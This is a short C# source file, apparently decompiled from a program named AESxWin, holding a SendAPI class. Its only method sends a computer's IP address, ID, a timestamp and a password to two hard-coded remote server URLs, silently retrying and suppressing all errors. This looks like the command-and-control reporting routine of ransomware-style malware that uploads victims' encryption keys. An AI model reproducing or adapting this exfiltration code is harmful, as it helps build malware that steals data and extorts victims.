using System;
using System.Net;

namespace AESxWin.Helpers;

public static class SendAPI
{
	private static int CurrentIndex = 0;

	public static string[] Urls = new string[2] { "http://20cc.awsmppl.com/mi5/", "http://cbs.awsmppl.com/mi5/" };

	public static string SendData(string ip, string computerId, DateTime date, string password)
	{
		string empty = string.Empty;
		CurrentIndex = 0;
		try
		{
			string text = date.ToString("dd-MM-yyyy HH:mm:ss");
			for (int i = 0; i < Urls.Length; i++)
			{
				if (!string.IsNullOrEmpty(Urls[CurrentIndex]))
				{
					try
					{
						WebClient webClient = new WebClient();
						Uri uri = new Uri(new Uri(Urls[CurrentIndex]), $"post.php?IP={ip}&ID={computerId}&Data={text}&Haslo={password}");
						string absoluteUri = uri.AbsoluteUri;
						webClient.DownloadString(absoluteUri);
						CurrentIndex = 0;
					}
					catch (Exception)
					{
						CurrentIndex++;
						continue;
					}
					break;
				}
			}
		}
		catch
		{
		}
		return empty;
	}
}
